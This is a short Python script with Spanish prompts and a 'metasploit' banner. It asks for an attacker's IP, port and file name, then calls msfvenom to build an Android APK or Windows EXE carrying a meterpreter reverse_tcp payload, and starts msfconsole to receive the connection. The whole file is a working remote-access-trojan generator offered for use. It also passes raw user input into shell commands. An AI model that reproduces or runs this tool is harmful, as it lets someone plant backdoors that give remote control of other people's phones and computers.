#!/usr/bin/python
#-*- coding:utf8-*-

import os,sys,time

import socket

blanco = '\u001b[30m'
rojo = '\u001b[31m'
verde = '\u001b[32m'
amarillo = '\u001b[33m'
azul = '\u001b[34m'
magenta = '\u001b[35m'
cyan = '\u001b[36m'
blanco = '\u001b[37m'






def entrada1():
	os.system("clear")
	print (rojo+"Tu direccion ip es: ")
	direccion()
	host = input(blanco+"Direccion IP/host: ")
	port = input("Puerto alojado(8080): ")
	nombre = input("Nombre del archivo: ")

	print (rojo+"Usaremos los siguientes párametros [msfvenom -p android/meterpreter/reverse_tcp LHOST="+ str(host) +" LPORT="+ str(port) +" R > "+ str(nombre) +".apk] ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ str(host) +" LPORT="+ str(port) +" R > "+ str(nombre) +".apk")

	os.system("msfconsole")

def direccion():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print(cyan+s.getsockname()[0])



def entrada2():
	os.system("clear")
	print (verde+"Tu direccion ip es: ")
	direccion()
	host = input(blanco+"Direccion IP/host: ")
	port = input("Puerto alojado(8080): ")
	nombre = input("Nombre del archivo: ")

	print (amarillo +"Usaremos los siguientes párametros [msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ host +" LPORT="+ port +" R > "+ nombre +".exe] ")
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ host +" LPORT="+ port +" R > "+ nombre +".exe")

	os.system("msfconsole")	



time.sleep(1.2)
os.system("clear")
print(rojo+str("                _                  _       _ _   "))
print(str(rojo+"               | |                | |     (_) |  "))
print(str(verde+" _ __ ___   ___| |_ __ _ ___ _ __ | | ___  _| |_ "))
print(str(amarillo+"| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __|"))
print(str(azul+"| | | | | |  __/ || (_| \__ \ |_) | | (_) | | |_ "))
print(str(cyan+"|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__|"))
print(str(magenta+"                            | |                  "))
print(str(blanco+"                            |_|                  "+blanco))
time.sleep(0.2)

print ("[1]- Android")
print ("[2]- Pc ")
print ("[3]- Salir"+verde)


inp = input("DarkGhost-$ "+blanco)

if inp == "1":
	entrada1()

elif inp == "2":
	
	entrada2()

elif inp == "3":
	print ("[!]Saliendo")
	time.sleep(0.5)
	exit()

else:
	os.system("clear")
	time.sleep(0.2)
	print (rojo+"[!] Ingresaste un dato incorrecto")
	time.sleep(2)
	os.system("clear")
	print ("[!]Saliendo")
	time.sleep(2)
	exit()
		